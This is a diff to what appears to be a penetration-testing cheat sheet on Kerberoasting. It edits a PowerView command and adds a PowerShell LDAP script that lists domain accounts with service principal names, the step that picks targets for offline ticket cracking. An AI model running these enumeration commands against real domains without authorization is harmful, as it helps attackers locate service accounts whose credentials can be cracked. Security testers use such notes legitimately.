@@ -9,12 +9,31 @@ Send a request to a TGT for a Kerberos token, dump it from memory, crack it loca
 Vulnerable users in domain
 
 ```
-Get-NetUser | Where-Object {$_.servicePrincipalName} | fl
+Get-NetUser -SPN | select serviceprincipalname    
 
 get-adobject | Where-Object {$_.serviceprincipalname -ne $null -and $_.distinguishedname -like "*CN=Users*" -and $_.cn -ne "krbtgt"}
 get-adobject -filter {serviceprincipalname -ne $null} -prop serviceprincipalname
 
 setspn -T <domain> -Q */*
+```
+
+Enumerate with LDAP Powershell module
+
+```
+$ldapFilter = "(&(objectClass=user)(objectCategory=user)(servicePrincipalName=*))";
+$domain = New-Object System.DirectoryServices.DirectoryEntry;
+$search = New-Object System.DirectoryServices.DirectorySearcher;
+$search.SearchRoot = $domain;
+$search.PageSize = 1000;
+$search.Filter = $ldapFilter;
+$search.SearchScope = "Subtree";
+$results = $search.FindAll()
+$Results = foreach ($result in $results){
+$result_entry = $result.GetDirectoryEntry();
+$result_entry | Select-Object @{
+Name = "Username"; 
+Expression = { $_.sAMAccountName }},@{Name = "SPN"; Expression = { $_.servicePrincipalName | Select-Object -First 1 }}}
+$Results;
 ```
 
 Enumerate past remote sessions on local machine
